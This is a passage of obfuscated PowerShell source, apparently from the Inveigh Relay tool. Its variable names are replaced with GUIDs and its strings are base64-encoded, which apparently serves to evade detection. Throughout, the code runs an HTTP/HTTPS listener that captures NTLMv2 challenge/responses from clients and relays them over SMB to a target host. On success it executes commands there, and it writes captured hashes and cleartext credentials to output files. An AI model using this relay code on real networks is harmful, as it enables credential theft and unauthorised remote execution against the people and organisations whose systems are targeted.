                        ${14770f41645f456d8f09e703674e2364}.console_queue.add($(Get-Date -format 's') + " - ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} NTLMv2 challenge/response captured from " + ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.address + "(" + ${c085cc7852874170b6a664242423c911} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KQA6AAoA'))) + ${14770f41645f456d8f09e703674e2364}.HTTP_NTLM_hash)
                        if(${14770f41645f456d8f09e703674e2364}.file_output)
                        {
                            ${14770f41645f456d8f09e703674e2364}.console_queue.add("${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} NTLMv2 challenge/response written to " + ${14770f41645f456d8f09e703674e2364}.NTLMv2_out_file)
                        }
                    }
                    if ((${14770f41645f456d8f09e703674e2364}.IP_capture_list -notcontains ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address) -and (-not ${5402a5b7196e48efb96da3fc6772459a}.EndsWith('$')) -and (!${14770f41645f456d8f09e703674e2364}.spoofer_repeat))
                    {
                        ${14770f41645f456d8f09e703674e2364}.IP_capture_list += ${14770f41645f456d8f09e703674e2364}.request.RemoteEndpoint.Address
                    }
                }
                ${14770f41645f456d8f09e703674e2364}.response.StatusCode = 200
                ${467671d871af40c5a207d5224d4c3cf4} = ''
                if ((${14770f41645f456d8f09e703674e2364}.SMB_relay) -and (${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step -eq 3))
                {
                    if((!${d194a1cff36f443691fe7b6dae84db94}) -or (${d194a1cff36f443691fe7b6dae84db94} -contains ${5402a5b7196e48efb96da3fc6772459a}) -or (${d194a1cff36f443691fe7b6dae84db94} -contains "${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a}"))
                    {
                        if((${bb9de80bf8c74ca39ebee231186cdfb9} -eq 'y') -or ((${bb9de80bf8c74ca39ebee231186cdfb9} -eq 'n') -and (-not ${5402a5b7196e48efb96da3fc6772459a}.EndsWith('$'))))
                        {
                            if(${14770f41645f456d8f09e703674e2364}.SMBRelay_failed_list -notcontains "${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} ${b4c7b8b4490e41f88e9083ddb989ee62}")
                            {
                                if(${30427c4796fd43a5a0e1ec4098ac1cb8} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQB2ADIA'))))
                                {
                                    ${14770f41645f456d8f09e703674e2364}.console_queue.add("Sending ${30427c4796fd43a5a0e1ec4098ac1cb8} response for ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} for relay to ${b4c7b8b4490e41f88e9083ddb989ee62}")
                                    ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - Sending ${30427c4796fd43a5a0e1ec4098ac1cb8} response for ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} for relay to ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                                    ${bb10a2d1ae824af3b4ebf4a5de490225} = SMBRelayResponse ${b5a410ab8b3741c7aa10b8c950fa2b93} ${a9193eb32e9d4059a8ee112591b4c284} ${aae1d8c26b7d46bc9af9c61caec0e833}
                                    ${bb10a2d1ae824af3b4ebf4a5de490225} = ${bb10a2d1ae824af3b4ebf4a5de490225}[1..${bb10a2d1ae824af3b4ebf4a5de490225}.length]
                                    if((!${7a0331efccb749c69c6920e567d0dc13}) -and ([System.BitConverter]::ToString(${bb10a2d1ae824af3b4ebf4a5de490225}[9..12]) -eq ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))))
                                    {
                                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} to SMB relay authentication successful for ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} to SMB relay authentication successful for ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                                        ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 4
                                        SMBRelayExecute ${b5a410ab8b3741c7aa10b8c950fa2b93} ${aae1d8c26b7d46bc9af9c61caec0e833}          
                                    }
                                    else
                                    {
                                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} to SMB relay authentication failed for ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - ${d6c0d2c71d2b4c2bbf3e5a2de5b66ec2} to SMB relay authentication failed for ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                                        ${14770f41645f456d8f09e703674e2364}.SMBRelay_failed_list += "${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} ${b4c7b8b4490e41f88e9083ddb989ee62}"
                                        ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
                                        ${b5a410ab8b3741c7aa10b8c950fa2b93}.Close()
                                    }
                                }
                                else
                                {
                                    ${14770f41645f456d8f09e703674e2364}.console_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQB2ADEAIABTAE0AQgAgAHIAZQBsAGEAeQAgAG4AbwB0ACAAeQBlAHQAIABzAHUAcABwAG8AcgB0AGUAZAA='))))
                                    ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - NTLMv1 relay not yet supported")])
                                    ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
                                    ${b5a410ab8b3741c7aa10b8c950fa2b93}.Close()
                                }
                            }
                            else
                            {
                                ${14770f41645f456d8f09e703674e2364}.console_queue.add("Aborting relay since ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} has already been tried on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                                ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - Aborting relay since ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} has already been tried on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                                ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
                                ${b5a410ab8b3741c7aa10b8c950fa2b93}.Close()
                            }
                        }
                        else
                        {
                            ${14770f41645f456d8f09e703674e2364}.console_queue.add("Aborting relay since ${5402a5b7196e48efb96da3fc6772459a} appears to be a machine account")
                            ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - Aborting relay since ${5402a5b7196e48efb96da3fc6772459a} appears to be a machine account")])
                            ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
                            ${b5a410ab8b3741c7aa10b8c950fa2b93}.Close()
                        }
                    }
                    else
                    {
                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} not on relay username list")
                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} not on relay username list")])
                        ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
                        ${b5a410ab8b3741c7aa10b8c950fa2b93}.Close()
                    }
                }
            }
            else
            {
                ${3a18381025b142139edad8fb960096a4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
            }
        }
        [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes(${14770f41645f456d8f09e703674e2364}.message)
        ${14770f41645f456d8f09e703674e2364}.response.ContentLength64 = $HTTP_buffer.length
        ${14770f41645f456d8f09e703674e2364}.response.AddHeader($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBXAFcALQBBAHUAdABoAGUAbgB0AGkAYwBhAHQAZQA='))),${3a18381025b142139edad8fb960096a4})
        ${7d044585b27d4844b474676a67e27630} = ${14770f41645f456d8f09e703674e2364}.response.OutputStream
        ${7d044585b27d4844b474676a67e27630}.write($HTTP_buffer, 0, $HTTP_buffer.length)
        ${7d044585b27d4844b474676a67e27630}.close()
    }
    ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Stop()
    ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Close()
}
${1015781384844003aa4400b0ea751493} = 
{
    param (${e1da88ca03e24046b73a694ac4b88237})
    if(${e1da88ca03e24046b73a694ac4b88237})
    {    
        ${838f02a929b643b48921819137074521} = new-timespan -Minutes ${e1da88ca03e24046b73a694ac4b88237}
        ${f4c99e9308ff4ef09ae00148e564e102} = [diagnostics.stopwatch]::StartNew()
    }
    while (${14770f41645f456d8f09e703674e2364}.relay_running)
    {
        if(${e1da88ca03e24046b73a694ac4b88237})
        {    
            if(${f4c99e9308ff4ef09ae00148e564e102}.elapsed -ge ${838f02a929b643b48921819137074521})
            {
                if(${14770f41645f456d8f09e703674e2364}.HTTP_listener.IsListening)
                {
                    ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Stop()
                    ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Close()
                }
                ${14770f41645f456d8f09e703674e2364}.console_queue.add("Inveigh Relay exited due to run time at $(Get-Date -format 's')")
                ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - Inveigh Relay exited due to run time")])
                sleep -m 5
                ${14770f41645f456d8f09e703674e2364}.relay_running = $false
                if(${14770f41645f456d8f09e703674e2364}.HTTPS)
                {
                    & $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBoAA=='))) http delete sslcert ipport=0.0.0.0:443 > $null
                    try
                    {
                        ${7e5d050b3aea4cd0887741807a5571b0} = New-Object System.Security.Cryptography.X509Certificates.X509Store("My",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAE0AYQBjAGgAaQBuAGUA'))))
                        ${7e5d050b3aea4cd0887741807a5571b0}.Open($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))))
                        ${bf44b319df8e49b3bbfa07b718a1f591} = ${7e5d050b3aea4cd0887741807a5571b0}.certificates.find($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABCAHkAVABoAHUAbQBiAHAAcgBpAG4AdAA='))),${14770f41645f456d8f09e703674e2364}.certificate_thumbprint,$false)[0]
                        ${7e5d050b3aea4cd0887741807a5571b0}.Remove(${bf44b319df8e49b3bbfa07b718a1f591})
                        ${7e5d050b3aea4cd0887741807a5571b0}.Close()
                    }
                    catch
                    {
                        if(${14770f41645f456d8f09e703674e2364}.status_output)
                        {
                            ${14770f41645f456d8f09e703674e2364}.console_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAEwAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABEAGUAbABlAHQAaQBvAG4AIABFAHIAcgBvAHIAIAAtACAAUgBlAG0AbwB2AGUAIABNAGEAbgB1AGEAbABsAHkA'))))
                        }
                        ${14770f41645f456d8f09e703674e2364}.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")
                        if(${14770f41645f456d8f09e703674e2364}.file_output)
                        {
                            "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"| Out-File ${14770f41645f456d8f09e703674e2364}.log_out_file -Append   
                        }
                    }
                }     
                ${14770f41645f456d8f09e703674e2364}.HTTP = $false
                ${14770f41645f456d8f09e703674e2364}.HTTPS = $false
            }
        }
        if(${14770f41645f456d8f09e703674e2364}.file_output -and (!${14770f41645f456d8f09e703674e2364}.running -or !${14770f41645f456d8f09e703674e2364}.bruteforce_running))
        {
            while(${14770f41645f456d8f09e703674e2364}.log_file_queue.Count -gt 0)
            {
                ${14770f41645f456d8f09e703674e2364}.log_file_queue[0]|Out-File ${14770f41645f456d8f09e703674e2364}.log_out_file -Append
                ${14770f41645f456d8f09e703674e2364}.log_file_queue.RemoveRange(0,1)
            }
            while(${14770f41645f456d8f09e703674e2364}.NTLMv1_file_queue.Count -gt 0)
            {
                ${14770f41645f456d8f09e703674e2364}.NTLMv1_file_queue[0]|Out-File ${14770f41645f456d8f09e703674e2364}.NTLMv1_out_file -Append
                ${14770f41645f456d8f09e703674e2364}.NTLMv1_file_queue.RemoveRange(0,1)
            }
            while(${14770f41645f456d8f09e703674e2364}.NTLMv2_file_queue.Count -gt 0)
            {
                ${14770f41645f456d8f09e703674e2364}.NTLMv2_file_queue[0]|Out-File ${14770f41645f456d8f09e703674e2364}.NTLMv2_out_file -Append
                ${14770f41645f456d8f09e703674e2364}.NTLMv2_file_queue.RemoveRange(0,1)
            }
            while(${14770f41645f456d8f09e703674e2364}.cleartext_file_queue.Count -gt 0)
            {
                ${14770f41645f456d8f09e703674e2364}.cleartext_file_queue[0]|Out-File ${14770f41645f456d8f09e703674e2364}.cleartext_out_file -Append
                ${14770f41645f456d8f09e703674e2364}.cleartext_file_queue.RemoveRange(0,1)
            }
        }
        sleep -m 5
    }
 }
Function HTTPListener()
{
    ${14770f41645f456d8f09e703674e2364}.HTTP_listener = New-Object System.Net.HttpListener
    if(${14770f41645f456d8f09e703674e2364}.HTTP)
    {
        ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Prefixes.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAqADoAOAAwAC8A'))))
    }
    if(${14770f41645f456d8f09e703674e2364}.HTTPS)
    {
        ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Prefixes.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvACoAOgA0ADQAMwAvAA=='))))
    }
    ${14770f41645f456d8f09e703674e2364}.HTTP_listener.AuthenticationSchemes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) 
    ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Start()
    ${54d550679ca6405a8f66098371250f26} = [runspacefactory]::CreateRunspace()
    ${54d550679ca6405a8f66098371250f26}.Open()
    ${54d550679ca6405a8f66098371250f26}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${14770f41645f456d8f09e703674e2364})
    ${88f07b38d55c49c6b048648e08420c05} = [powershell]::Create()
    ${88f07b38d55c49c6b048648e08420c05}.Runspace = ${54d550679ca6405a8f66098371250f26}
    ${88f07b38d55c49c6b048648e08420c05}.AddScript(${0d1737d878564f6daeda9a795d5580f5}) > $null
    ${88f07b38d55c49c6b048648e08420c05}.AddScript(${a80e3f9a637441f690c1b02a33c0865b}) > $null
    ${88f07b38d55c49c6b048648e08420c05}.AddScript(${8df219cda85a437db1261227037d7cfb}) > $null
    ${88f07b38d55c49c6b048648e08420c05}.AddScript(${cc6435638a5d465d8ca47df73dad78f6}) > $null
    ${88f07b38d55c49c6b048648e08420c05}.AddScript(${16f8c8794ab74ad68dc5c2a920b74294}) > $null
    ${88f07b38d55c49c6b048648e08420c05}.AddScript(${c71aad59e5fa41b5b9eaed1500be2c61}).AddArgument(
        ${b4c7b8b4490e41f88e9083ddb989ee62}).AddArgument(${a9b4a2ed80da4358b66ed01c153ac674}).AddArgument(${d194a1cff36f443691fe7b6dae84db94}).AddArgument(
        ${c38d4b076a0145059ce8d4f43f98df67}).AddArgument(${ce8aca9715a04e2c9f2a44b1b8fdfadd}).AddArgument(
        ${bb9de80bf8c74ca39ebee231186cdfb9}).AddArgument(${a381358e226d49d5846c08b31f90af24}) > $null
    ${88f07b38d55c49c6b048648e08420c05}.BeginInvoke() > $null
}
Function ControlRelayLoop()
{
    ${f8515074ac7e4051869bf19aef3b80f5} = [runspacefactory]::CreateRunspace()
    ${f8515074ac7e4051869bf19aef3b80f5}.Open()
    ${f8515074ac7e4051869bf19aef3b80f5}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${14770f41645f456d8f09e703674e2364})
    ${0438cc1e2b25440b96976e606a4878e2} = [powershell]::Create()
    ${0438cc1e2b25440b96976e606a4878e2}.Runspace = ${f8515074ac7e4051869bf19aef3b80f5}
    ${0438cc1e2b25440b96976e606a4878e2}.AddScript(${0d1737d878564f6daeda9a795d5580f5}) > $null
    ${0438cc1e2b25440b96976e606a4878e2}.AddScript(${1015781384844003aa4400b0ea751493}).AddArgument(${e1da88ca03e24046b73a694ac4b88237}) > $null
    ${0438cc1e2b25440b96976e606a4878e2}.BeginInvoke() > $null
}
if(${14770f41645f456d8f09e703674e2364}.HTTP -or ${14770f41645f456d8f09e703674e2364}.HTTPS)
{
    HTTPListener
}
if(${e1da88ca03e24046b73a694ac4b88237} -or ${14770f41645f456d8f09e703674e2364}.file_output)
{
    ControlRelayLoop
}
if(!${14770f41645f456d8f09e703674e2364}.running -and ${14770f41645f456d8f09e703674e2364}.console_output)
{
    :console_loop while(${14770f41645f456d8f09e703674e2364}.relay_running -and ${14770f41645f456d8f09e703674e2364}.console_output)
    {
        while(${14770f41645f456d8f09e703674e2364}.console_queue.Count -gt 0)
        {
            if(${14770f41645f456d8f09e703674e2364}.output_stream_only)
            {
                write-output(${14770f41645f456d8f09e703674e2364}.console_queue[0] + ${14770f41645f456d8f09e703674e2364}.newline)
                ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard (${14770f41645f456d8f09e703674e2364}.console_queue[0])
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                    {
                        write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                        ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))
                    {
                        if(${14770f41645f456d8f09e703674e2364}.file_output)
                        {
                            write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                        }
                        ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))
                    {
                        write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                        ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))
                    {
                        write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                        ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA==')))
                    {
                        write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                        ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                        ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                    }
                } 
            }   
        }
        if(${14770f41645f456d8f09e703674e2364}.console_input)
        {
            if([console]::KeyAvailable)
            {
                ${14770f41645f456d8f09e703674e2364}.console_output = $false
                BREAK console_loop
            }
        }
        sleep -m 5
    }
}
}
Function Stop-Inveigh
{
    if(${14770f41645f456d8f09e703674e2364})
    {
        if(${14770f41645f456d8f09e703674e2364}.running -or ${14770f41645f456d8f09e703674e2364}.relay_running -or ${14770f41645f456d8f09e703674e2364}.bruteforce_running)
        {
            if(${14770f41645f456d8f09e703674e2364}.HTTP_listener.IsListening)
            {
                ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Stop()
                ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Close()
            }
            if(${14770f41645f456d8f09e703674e2364}.bruteforce_running)
            {
                ${14770f41645f456d8f09e703674e2364}.bruteforce_running = $false
                ${14770f41645f456d8f09e703674e2364}.status_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")|Out-Null
                ${14770f41645f456d8f09e703674e2364}.HTTP_listener.server.blocking = $false
                sleep -s 1
                ${14770f41645f456d8f09e703674e2364}.HTTP_listener.server.Close()
                sleep -s 1
                ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Stop()
                ${14770f41645f456d8f09e703674e2364}.status_queue.add("Inveigh Brute Force exited at $(Get-Date -format 's')")|Out-Null
                ${14770f41645f456d8f09e703674e2364}.log.add("$(Get-Date -format 's') - Inveigh Brute Force exited")|Out-Null
                if(${14770f41645f456d8f09e703674e2364}.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh Brute Force exited"| Out-File ${14770f41645f456d8f09e703674e2364}.log_out_file -Append
                }
            }
            if(${14770f41645f456d8f09e703674e2364}.relay_running)
            {
                ${14770f41645f456d8f09e703674e2364}.relay_running = $false
                ${14770f41645f456d8f09e703674e2364}.status_queue.add("Inveigh Relay exited at $(Get-Date -format 's')")|Out-Null
                ${14770f41645f456d8f09e703674e2364}.log.add("$(Get-Date -format 's') - Inveigh Relay exited")|Out-Null
                if(${14770f41645f456d8f09e703674e2364}.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh Relay exited"| Out-File ${14770f41645f456d8f09e703674e2364}.log_out_file -Append
                }
            } 
            if(${14770f41645f456d8f09e703674e2364}.running)
            {
                ${14770f41645f456d8f09e703674e2364}.running = $false
                ${14770f41645f456d8f09e703674e2364}.status_queue.add("Inveigh exited at $(Get-Date -format 's')")|Out-Null
                ${14770f41645f456d8f09e703674e2364}.log.add("$(Get-Date -format 's') - Inveigh exited")|Out-Null
                if(${14770f41645f456d8f09e703674e2364}.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh exited"| Out-File ${14770f41645f456d8f09e703674e2364}.log_out_file -Append
                }
            } 
        }
        else
        {
            ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAYQByAGUAIABuAG8AIAByAHUAbgBuAGkAbgBnACAASQBuAHYAZQBpAGcAaAAgAGYAdQBuAGMAdABpAG8AbgBzAA==')))) | Out-Null
        }
        if(${14770f41645f456d8f09e703674e2364}.HTTPS)
        {
            & $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBoAA=='))) http delete sslcert ipport=0.0.0.0:443 > $null
            try
            {
                ${7e5d050b3aea4cd0887741807a5571b0} = New-Object System.Security.Cryptography.X509Certificates.X509Store("My",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAE0AYQBjAGgAaQBuAGUA'))))
                ${7e5d050b3aea4cd0887741807a5571b0}.Open($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))))
                ${bf44b319df8e49b3bbfa07b718a1f591} = ${7e5d050b3aea4cd0887741807a5571b0}.certificates.find($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABCAHkAVABoAHUAbQBiAHAAcgBpAG4AdAA='))),${14770f41645f456d8f09e703674e2364}.certificate_thumbprint,$FALSE)[0]
                ${7e5d050b3aea4cd0887741807a5571b0}.Remove(${bf44b319df8e49b3bbfa07b718a1f591})
                ${7e5d050b3aea4cd0887741807a5571b0}.Close()
            }
            catch
            {
                ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAEwAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABEAGUAbABlAHQAaQBvAG4AIABFAHIAcgBvAHIAIAAtACAAUgBlAG0AbwB2AGUAIABNAGEAbgB1AGEAbABsAHkA'))))|Out-Null
                ${14770f41645f456d8f09e703674e2364}.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")|Out-Null
                if(${14770f41645f456d8f09e703674e2364}.file_output)
                {
                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"|Out-File ${14770f41645f456d8f09e703674e2364}.log_out_file -Append   
                }
            }
        }
        ${14770f41645f456d8f09e703674e2364}.HTTP = $false
        ${14770f41645f456d8f09e703674e2364}.HTTPS = $false
    }
    else
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAYQByAGUAIABuAG8AIAByAHUAbgBuAGkAbgBnACAASQBuAHYAZQBpAGcAaAAgAGYAdQBuAGMAdABpAG8AbgBzAA=='))))|Out-Null
    }
    if(${14770f41645f456d8f09e703674e2364}.status_output)
    {
        while(${14770f41645f456d8f09e703674e2364}.status_queue.Count -gt 0)
        {
            if(${14770f41645f456d8f09e703674e2364}.output_stream_only)
            {
                write-output(${14770f41645f456d8f09e703674e2364}.status_queue[0] + ${14770f41645f456d8f09e703674e2364}.newline)
                ${14770f41645f456d8f09e703674e2364}.status_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard (${14770f41645f456d8f09e703674e2364}.status_queue[0])
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                    {
                        write-warning ${14770f41645f456d8f09e703674e2364}.status_queue[0]
                        ${14770f41645f456d8f09e703674e2364}.status_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAEwAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABEAGUAbABlAHQAaQBvAG4AIABFAHIAcgBvAHIAIAAtACAAUgBlAG0AbwB2AGUAIABNAGEAbgB1AGEAbABsAHkA')))
                    {
                        write-warning ${14770f41645f456d8f09e703674e2364}.status_queue[0]
                        ${14770f41645f456d8f09e703674e2364}.status_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output ${14770f41645f456d8f09e703674e2364}.status_queue[0]
                        ${14770f41645f456d8f09e703674e2364}.status_queue.RemoveRange(0,1)
                    }
                } 
            }   
        }
    }
} 
Function Get-Inveigh
{
    while(${14770f41645f456d8f09e703674e2364}.console_queue.Count -gt 0)
    {
        if(${14770f41645f456d8f09e703674e2364}.output_stream_only)
        {
            write-output(${14770f41645f456d8f09e703674e2364}.console_queue[0] + ${14770f41645f456d8f09e703674e2364}.newline)
            ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
        }
        else
        {
            switch -wildcard (${14770f41645f456d8f09e703674e2364}.console_queue[0])
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                {
                    write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                    ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))
                {
                    if(${14770f41645f456d8f09e703674e2364}.file_output)
                    {
                        write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                    }
                    ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))
                {
                    write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                    ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))
                {
                    write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                    ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                }
